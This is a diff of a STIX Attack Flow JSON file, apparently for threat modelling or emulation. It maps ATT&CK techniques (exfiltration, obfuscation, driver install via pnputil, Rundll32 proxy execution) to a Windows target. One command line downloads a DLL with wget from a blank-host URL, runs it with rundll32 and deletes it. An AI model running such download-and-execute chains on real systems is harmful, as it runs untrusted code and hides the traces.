+            "id": "attack-action--4280ccca-4d3f-4d4b-8d47-b4dfded0524d",
+            "created": "2024-05-12T08:20:06.342732Z",
+            "modified": "2024-05-12T08:20:06.342732Z",
+            "technique_id": "T1048.003: Exfiltration Over Alternative Protocol, Exfiltration Over Unencrypted Non-C2 Protocol",
+            "name": "T1048.003: Exfiltration Over Alternative Protocol, Exfiltration Over Unencrypted Non-C2 Protocol",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--171f9a4b-afe3-4785-b789-5e67d40d1b64",
+            "created": "2024-05-12T08:20:06.342732Z",
+            "modified": "2024-05-12T08:20:06.342732Z",
+            "technique_id": "T1001: Data Obfuscation",
+            "name": "T1001: Data Obfuscation",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--3e71b611-f72a-44aa-8753-70d2d8a4225a",
+            "created": "2024-05-12T08:20:06.342732Z",
+            "modified": "2024-05-12T08:20:06.342732Z",
+            "technique_id": "T1547",
+            "name": "T1547",
+            "description": "Install a driver via pnputil.exe",
+            "command_ref": "process--eb8e1662-05c6-4239-aec4-19a1f7af14eb",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--6f5a64db-9f45-4f62-9fd3-8f03affaa8f3"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--eb8e1662-05c6-4239-aec4-19a1f7af14eb",
+            "command_line": "pnputil.exe /add-driver \"C:\\Windows\\INF\\usbstor.inf\""
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--6f5a64db-9f45-4f62-9fd3-8f03affaa8f3",
+            "created": "2024-05-12T08:20:06.341244Z",
+            "modified": "2024-05-12T08:20:06.341244Z",
+            "technique_id": "T1218.011",
+            "name": "T1218.011",
+            "description": "Run malicous dll using Rundll32",
+            "command_ref": "process--daacc9b4-9c7f-4bf5-8b72-d9a88ac4680c",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--daacc9b4-9c7f-4bf5-8b72-d9a88ac4680c",
+            "command_line": "wget http:///T1218_011.dll -OutFile T1218_011.dll; rundll32.exe T1218_011.dll,krnl; del T1218_011.dll"
+        }
+    ]
+}
